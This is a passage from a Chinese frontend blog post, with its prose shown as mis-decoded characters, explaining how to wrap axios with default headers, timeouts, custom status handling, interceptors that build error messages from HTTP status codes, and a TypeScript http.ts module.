è¦†ç›–æ›´å¤šçš„è°ƒç”¨åœºæ™¯ã€‚</p><p>ç”±äºï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¤´éƒ½æ˜¯å›ºå®šçš„ï¼Œåªæœ‰å°‘éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä¼šéœ€è¦ä¸€äº›ç‰¹æ®Šçš„è¯·æ±‚å¤´ï¼Œæ‰€ä»¥ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘é‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯ï¼Œå°†æ™®é€‚æ€§çš„è¯·æ±‚å¤´ä½œä¸ºåŸºç¡€é…ç½®ã€‚å½“éœ€è¦ç‰¹æ®Šè¯·æ±‚å¤´æ—¶ï¼Œå°†ç‰¹æ®Šè¯·æ±‚å¤´ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¦†ç›–åŸºç¡€é…ç½®ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">    ...</span><br><span class="line">headers: &#123;</span><br><span class="line">        <span class="keyword">get</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=utf-8&#x27;</span></span><br><span class="line">          <span class="comment">// åœ¨å¼€å‘ä¸­ï¼Œä¸€èˆ¬è¿˜éœ€è¦å•ç‚¹ç™»å½•æˆ–è€…å…¶ä»–åŠŸèƒ½çš„é€šç”¨è¯·æ±‚å¤´ï¼Œå¯ä»¥ä¸€å¹¶é…ç½®è¿›æ¥</span></span><br><span class="line">        &#125;,</span><br><span class="line">        post: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">          <span class="comment">// åœ¨å¼€å‘ä¸­ï¼Œä¸€èˆ¬è¿˜éœ€è¦å•ç‚¹ç™»å½•æˆ–è€…å…¶ä»–åŠŸèƒ½çš„é€šç”¨è¯·æ±‚å¤´ï¼Œå¯ä»¥ä¸€å¹¶é…ç½®è¿›æ¥</span></span><br><span class="line">        &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è·¨åŸŸã€è¶…æ—¶ã€å“åº”ç å¤„ç†"><a href="#è·¨åŸŸã€è¶…æ—¶ã€å“åº”ç å¤„ç†" class="headerlink" title="è·¨åŸŸã€è¶…æ—¶ã€å“åº”ç å¤„ç†"></a>è·¨åŸŸã€è¶…æ—¶ã€å“åº”ç å¤„ç†</h3><p>axios ä¸­ï¼Œæä¾›æ˜¯å¦å…è®¸è·¨åŸŸçš„å±æ€§â€”â€”withCredentialsï¼Œä»¥åŠé…ç½®è¶…æ—¶æ—¶é—´çš„å±æ€§â€”â€”timeoutï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå±æ€§ï¼Œå¯ä»¥è½»æ¾å¤„ç†è·¨åŸŸå’Œè¶…æ—¶çš„é—®é¢˜ã€‚</p><p>ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥è¯´è¯´å“åº”ç å¤„ç†ï¼š</p><p>axios æä¾›äº† validateStatus å±æ€§ï¼Œç”¨äºå®šä¹‰å¯¹äºç»™å®šçš„ HTTP å“åº”çŠ¶æ€ç æ˜¯ resolve æˆ– reject promiseã€‚æ‰€ä»¥ï¼Œæ­£å¸¸è®¾ç½®çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šå°†çŠ¶æ€ç ä¸º 2 ç³»åˆ—æˆ–è€… 304 çš„è¯·æ±‚è®¾ä¸º resolve çŠ¶æ€ï¼Œå…¶ä½™ä¸º reject çŠ¶æ€ã€‚ç»“æœå°±æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸šåŠ¡ä»£ç é‡Œï¼Œä½¿ç”¨ catch ç»Ÿä¸€æ•è·å“åº”é”™è¯¯çš„è¯·æ±‚ï¼Œä»è€Œè¿›è¡Œç»Ÿä¸€å¤„ç†ã€‚</p><p>ä½†æ˜¯ï¼Œç”±äºæˆ‘åœ¨ä»£ç é‡Œé¢ä½¿ç”¨äº† async-awaitï¼Œè€Œä¼—æ‰€å‘¨çŸ¥ï¼Œasync-await æ•è· catch çš„æ–¹å¼æä¸ºéº»çƒ¦ï¼Œæ‰€ä»¥ï¼Œåœ¨æ­¤å¤„ï¼Œæˆ‘é€‰æ‹©å°†æ‰€æœ‰å“åº”éƒ½è®¾ä¸º resolve çŠ¶æ€ï¼Œç»Ÿä¸€åœ¨ then å¤„ç†ã€‚</p><p>æ­¤éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line"><span class="comment">// è·¨åŸŸè¯·æ±‚æ—¶æ˜¯å¦éœ€è¦ä½¿ç”¨å‡­è¯</span></span><br><span class="line">withCredentials: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// è¯·æ±‚ 30s è¶…æ—¶</span></span><br><span class="line">timeout: <span class="number">30000</span>,</span><br><span class="line">validateStatus: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// ä½¿ç”¨async-awaitï¼Œå¤„ç†rejectæƒ…å†µè¾ƒä¸ºç¹çï¼Œæ‰€ä»¥å…¨éƒ¨è¿”å›resolveï¼Œåœ¨ä¸šåŠ¡ä»£ç ä¸­å¤„ç†å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è¯·æ±‚ã€å“åº”å¤„ç†"><a href="#è¯·æ±‚ã€å“åº”å¤„ç†" class="headerlink" title="è¯·æ±‚ã€å“åº”å¤„ç†"></a>è¯·æ±‚ã€å“åº”å¤„ç†</h3><p>åœ¨ä¸ä½¿ç”¨ axios çš„æƒ…å†µä¸‹ï¼Œæ¯æ¬¡è¯·æ±‚æˆ–è€…æ¥å—å“åº”ï¼Œéƒ½éœ€è¦å°†è¯·æ±‚æˆ–è€…å“åº”åºåˆ—åŒ–ã€‚</p><p>è€Œåœ¨ axios ä¸­ï¼Œ <code>transformRequest</code> å…è®¸åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚å‰ï¼Œä¿®æ”¹è¯·æ±‚æ•°æ®ï¼›<code>transformResponse</code> åœ¨ä¼ é€’ç»™ then/catch å‰ï¼Œå…è®¸ä¿®æ”¹å“åº”æ•°æ®ã€‚</p><p>é€šè¿‡è¿™ä¸¤ä¸ªé’©å­ï¼Œå¯ä»¥çœå»å¤§é‡é‡å¤çš„åºåˆ—åŒ–ä»£ç ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">    <span class="comment">// åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚å‰ï¼Œåºåˆ—åŒ–è¯·æ±‚æ•°æ®</span></span><br><span class="line">    transformRequest: [function (<span class="keyword">data</span>) &#123;</span><br><span class="line">        <span class="keyword">data</span> = JSON.stringify(<span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="comment">// åœ¨ä¼ é€’ç»™ then/catch å‰ï¼Œä¿®æ”¹å“åº”æ•°æ®</span></span><br><span class="line">    transformResponse: [function (<span class="keyword">data</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeof <span class="keyword">data</span> === <span class="string">&#x27;string&#x27;</span> &amp;&amp; <span class="keyword">data</span>.startsWith(<span class="string">&#x27;&#123;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">data</span> = JSON.parse(<span class="keyword">data</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ‹¦æˆªå™¨"><a href="#æ‹¦æˆªå™¨" class="headerlink" title="æ‹¦æˆªå™¨"></a>æ‹¦æˆªå™¨</h3><p>æ‹¦æˆªå™¨ï¼Œåˆ†ä¸ºè¯·æ±‚æ‹¦æˆªå™¨ä»¥åŠå“åº”æ‹¦æˆªå™¨ï¼Œåˆ†åˆ«åœ¨è¯·æ±‚æˆ–å“åº”è¢« then æˆ– catch å¤„ç†å‰æ‹¦æˆªå®ƒä»¬ã€‚</p><p>ä¹‹å‰æåˆ°è¿‡ï¼Œç”±äº async-await ä¸­ catch éš¾ä»¥å¤„ç†çš„é—®é¢˜ï¼Œæ‰€ä»¥å°†å‡ºé”™çš„æƒ…å†µä¹Ÿä½œä¸º resolve çŠ¶æ€è¿›è¡Œå¤„ç†ã€‚ä½†è¿™å¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¯·æ±‚æˆ–å“åº”å‡ºé”™çš„æƒ…å†µä¸‹ï¼Œç»“æœæ²¡æœ‰æ•°æ®åè®®ä¸­å®šä¹‰çš„ msg å­—æ®µï¼ˆæ¶ˆæ¯ï¼‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å‡ºé”™çš„æ—¶å€™ï¼Œæ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªç¬¦åˆè¿”å›æ ¼å¼çš„è¿”å›æ•°æ®ã€‚</p><p>ç”±äºï¼Œåœ¨ä¸šåŠ¡ä¸­ï¼Œæ²¡æœ‰éœ€è¦åœ¨è¯·æ±‚æ‹¦æˆªå™¨ä¸­åšé¢å¤–å¤„ç†çš„éœ€æ±‚ï¼Œæ‰€ä»¥ï¼Œè¯·æ±‚æ‹¦æˆªå™¨çš„ resolve çŠ¶æ€ï¼Œåªéœ€ç›´æ¥è¿”å›å°±å¯ä»¥äº†ã€‚</p><p>è¯·æ±‚æ‹¦æˆªå™¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// è¯·æ±‚æ‹¦æˆªå™¨</span><br><span class="line">service.interceptors.request.use(<span class="function"><span class="params">(config)</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function"><span class="params">(<span class="built_in">error</span>)</span> =&gt;</span> &#123;</span><br><span class="line">// é”™è¯¯æŠ›åˆ°ä¸šåŠ¡ä»£ç </span><br><span class="line">    <span class="built_in">error</span>.data = &#123;&#125;</span><br><span class="line">    <span class="built_in">error</span>.data.msg = <span class="string">&#x27;æœåŠ¡å™¨å¼‚å¸¸ï¼Œè¯·è”ç³»ç®¡ç†å‘˜ï¼&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> Promise.resolve(<span class="built_in">error</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†æ¥èŠèŠå“åº”æ‹¦æˆªå™¨ï¼Œè¿˜æ˜¯ä¹‹å‰çš„é‚£ä¸ªé—®é¢˜ï¼Œé™¤äº†è¯·æ±‚æˆ–å“åº”é”™è¯¯ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µä¹Ÿä¼šå¯¼è‡´è¿”å›çš„æ¶ˆæ¯ä½“ä¸ç¬¦åˆåè®®è§„èŒƒï¼Œé‚£å°±æ˜¯çŠ¶æ€ç ä¸ä¸º 2 ç³»åˆ—æˆ– 304 æ—¶ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦åšä¸€æ ·çš„å¤„ç†â€”â€”æ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªç¬¦åˆè¿”å›æ ¼å¼çš„è¿”å›æ•°æ®ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ç‚¹ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®ä¸åŒçš„çŠ¶æ€ç ç”Ÿæˆä¸åŒçš„æç¤ºä¿¡æ¯ï¼Œä»¥æ–¹ä¾¿å¤„ç†ä¸Šçº¿åçš„é—®é¢˜ã€‚</p><p>å“åº”æ‹¦æˆªå™¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¹æ®ä¸åŒçš„çŠ¶æ€ç ï¼Œç”Ÿæˆä¸åŒçš„æç¤ºä¿¡æ¯</span></span><br><span class="line"><span class="keyword">const</span> showStatus = <span class="function">(<span class="params">status</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">// è¿™ä¸€å¨ä»£ç å¯ä»¥ä½¿ç”¨ç­–ç•¥æ¨¡å¼è¿›è¡Œä¼˜åŒ–</span></span><br><span class="line">    <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">400</span>:</span><br><span class="line">            message = <span class="string">&#x27;è¯·æ±‚é”™è¯¯(400)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">            message = <span class="string">&#x27;æœªæˆæƒï¼Œè¯·é‡æ–°ç™»å½•(401)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">403</span>:</span><br><span class="line">            message = <span class="string">&#x27;æ‹’ç»è®¿é—®(403)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">404</span>:</span><br><span class="line">            message = <span class="string">&#x27;è¯·æ±‚å‡ºé”™(404)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">408</span>:</span><br><span class="line">            message = <span class="string">&#x27;è¯·æ±‚è¶…æ—¶(408)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line">            message = <span class="string">&#x27;æœåŠ¡å™¨é”™è¯¯(500)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">501</span>:</span><br><span class="line">            message = <span class="string">&#x27;æœåŠ¡æœªå®ç°(501)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">502</span>:</span><br><span class="line">            message = <span class="string">&#x27;ç½‘ç»œé”™è¯¯(502)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">503</span>:</span><br><span class="line">            message = <span class="string">&#x27;æœåŠ¡ä¸å¯ç”¨(503)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">504</span>:</span><br><span class="line">            message = <span class="string">&#x27;ç½‘ç»œè¶…æ—¶(504)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">505</span>:</span><br><span class="line">            message = <span class="string">&#x27;HTTPç‰ˆæœ¬ä¸å—æ”¯æŒ(505)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            message = <span class="string">`è¿æ¥å‡ºé”™(<span class="subst">$&#123;status&#125;</span>)!`</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;message&#125;</span>ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ–è”ç³»ç®¡ç†å‘˜ï¼`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å“åº”æ‹¦æˆªå™¨</span></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> status = response.status</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">200</span> || status &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†httpé”™è¯¯ï¼ŒæŠ›åˆ°ä¸šåŠ¡ä»£ç </span></span><br><span class="line">        msg = showStatus(status)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> response.data === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            response.data = &#123; msg &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.data.msg = msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// é”™è¯¯æŠ›åˆ°ä¸šåŠ¡ä»£ç </span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;è¯·æ±‚è¶…æ—¶æˆ–æœåŠ¡å™¨å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ–è”ç³»ç®¡ç†å‘˜ï¼&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em>tips1ï¼šå‹æƒ…æç¤ºï¼Œä¸Šé¢é‚£ä¸€å¨ switch-case ä»£ç ï¼Œå¯ä»¥ä½¿ç”¨ç­–ç•¥æ¨¡å¼è¿›è¡Œä¼˜åŒ–~</em></p><p><em>tips2ï¼šå¦‚æœæœ‰ä¸€äº›ä¸šåŠ¡ç›¸å…³çš„éœ€æ±‚ï¼Œå¯ä»¥åŠ åœ¨æ‹¦æˆªå™¨ä¸­ï¼Œæ¯”å¦‚ï¼šloadingã€é‰´æƒç­‰~</em></p><h3 id="æ”¯æŒ-TypeScript"><a href="#æ”¯æŒ-TypeScript" class="headerlink" title="æ”¯æŒ TypeScript"></a>æ”¯æŒ TypeScript</h3><p>ç”±äºå‰æ®µæ—¶é—´ï¼Œæˆ‘åœ¨éƒ¨é—¨å†…æ¨äº† TypeScriptï¼Œä¸ºäº†æ»¡è¶³è‡ªå·±çš„å¼ºè¿«ç—‡ï¼Œå°†æ‰€æœ‰ js æ–‡ä»¶æ”¹å†™ä¸ºäº† ts æ–‡ä»¶ã€‚ç”±äº axios æœ¬èº«æœ‰ TypeScript ç›¸å…³çš„æ”¯æŒï¼Œæ‰€ä»¥åªéœ€è¦æŠŠå¯¹åº”çš„ç±»å‹å¯¼å…¥ï¼Œç„¶åèµ‹å€¼å³å¯ã€‚</p><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http.ts</span></span><br><span class="line"><span class="keyword">import</span> axios, &#123; AxiosRequestConfig, AxiosResponse &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> showStatus = <span class="function">(<span class="params">status: <span class="built_in">number</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">400</span>:</span><br><span class="line">      message = <span class="string">&#x27;è¯·æ±‚é”™è¯¯(400)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">      message = <span class="string">&#x27;æœªæˆæƒï¼Œè¯·é‡æ–°ç™»å½•(401)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">403</span>:</span><br><span class="line">      message = <span class="string">&#x27;æ‹’ç»è®¿é—®(403)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">404</span>:</span><br><span class="line">      message = <span class="string">&#x27;è¯·æ±‚å‡ºé”™(404)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">408</span>:</span><br><span class="line">      message = <span class="string">&#x27;è¯·æ±‚è¶…æ—¶(408)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line">      message = <span class="string">&#x27;æœåŠ¡å™¨é”™è¯¯(500)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">501</span>:</span><br><span class="line">      message = <span class="string">&#x27;æœåŠ¡æœªå®ç°(501)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">502</span>:</span><br><span class="line">      message = <span class="string">&#x27;ç½‘ç»œé”™è¯¯(502)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">503</span>:</span><br><span class="line">      message = <span class="string">&#x27;æœåŠ¡ä¸å¯ç”¨(503)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">504</span>:</span><br><span class="line">      message = <span class="string">&#x27;ç½‘ç»œè¶…æ—¶(504)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">505</span>:</span><br><span class="line">      message = <span class="string">&#x27;HTTPç‰ˆæœ¬ä¸å—æ”¯æŒ(505)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      message = <span class="string">`è¿æ¥å‡ºé”™(<span class="subst">$&#123;status&#125;</span>)!`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;message&#125;</span>ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ–è”ç³»ç®¡ç†å‘˜ï¼`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">  <span class="comment">// è”è°ƒ</span></span><br><span class="line">  <span class="attr">baseURL</span>: process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span> ? <span class="string">`/`</span> : <span class="string">&#x27;/apis&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="attr">get</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=utf-8&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">post</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// æ˜¯å¦è·¨ç«™ç‚¹è®¿é—®æ§åˆ¶è¯·æ±‚</span></span><br><span class="line">  <span class="attr">withCredentials</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">30000</span>,</span><br><span class="line">  <span class="attr">transformRequest</span>: [<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    data = <span class="built_in">JSON</span>.stringify(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;],</span><br><span class="line">  validateStatus () &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨async-awaitï¼Œå¤„ç†rejectæƒ…å†µè¾ƒä¸ºç¹çï¼Œæ‰€ä»¥å…¨éƒ¨è¿”å›resolveï¼Œåœ¨ä¸šåŠ¡ä»£ç ä¸­å¤„ç†å¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">transformResponse</span>: [<span class="function">(<span 